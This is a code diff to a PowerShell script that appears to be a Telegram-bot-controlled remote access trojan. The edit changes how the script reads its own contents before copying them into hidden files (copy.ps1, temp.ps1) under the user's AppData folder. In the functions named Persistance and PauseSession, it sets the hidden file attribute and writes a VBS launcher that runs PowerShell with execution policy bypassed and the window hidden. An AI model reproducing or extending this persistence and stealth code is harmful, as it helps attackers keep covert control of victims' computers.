@@ -41,9 +41,7 @@ $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
-$scriptDirectory = $PSScriptRoot
-$currentScriptPath = Join-Path -Path $scriptDirectory -ChildPath $MyInvocation.MyCommand.Name
-$scriptContent = Get-Content -Path $currentScriptPath
+$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 $tick = [char]::ConvertFromUtf32(0x2705)
 $comp = [char]::ConvertFromUtf32(0x1F4BB)
 $closed = [char]::ConvertFromUtf32(0x1F6AB)
@@ -261,7 +259,7 @@ Start-Sleep -Milliseconds 10
 
 Function Persistance{
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\copy.ps1"
-$scriptContent | Out-File -FilePath $newScriptPath -force
+$scriptDirectory | Out-File -FilePath $newScriptPath -Force
 $attributes = [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $newScriptPath -Name Attributes -Value $attributes
 $tobat = @'
@@ -455,7 +453,7 @@ Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 Function PauseSession{
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
 sleep 1
-$scriptContent | Out-File -FilePath $newScriptPath -force
+$scriptDirectory | Out-File -FilePath $newScriptPath -Force
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
